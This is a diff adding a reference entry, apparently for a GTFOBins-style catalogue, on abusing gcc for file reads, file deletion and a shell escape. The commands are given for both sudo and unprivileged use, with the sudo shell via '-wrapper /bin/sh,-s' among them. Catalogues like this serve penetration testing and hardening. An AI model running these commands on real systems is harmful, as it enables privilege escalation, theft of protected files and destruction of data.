@@ -1,0 +1,41 @@
+gcc
+===
+
+File read
+---------
+
+[Sudo]
+    gcc -x c -E /path/to/input-file
+
+[Unprivileged]
+    gcc -x c -E /path/to/input-file
+
+[Sudo]
+    gcc @/path/to/input-file
+    The file is read and parsed as a list of files (one per line), the content is displayed as error messages.
+
+[Unprivileged]
+    gcc @/path/to/input-file
+    The file is read and parsed as a list of files (one per line), the content is displayed as error messages.
+
+File write
+----------
+
+[Sudo]
+    gcc -x c /dev/null -o /path/to/input-file
+    This actually deletes the file.
+
+[Unprivileged]
+    gcc -x c /dev/null -o /path/to/input-file
+    This actually deletes the file.
+
+Shell
+-----
+
+[Sudo]
+    gcc -wrapper /bin/sh,-s x
+    In some older versions, the `x` argument must instead reference any existing file.
+
+[Unprivileged]
+    gcc -wrapper /bin/sh,-s x
+    In some older versions, the `x` argument must instead reference any existing file.
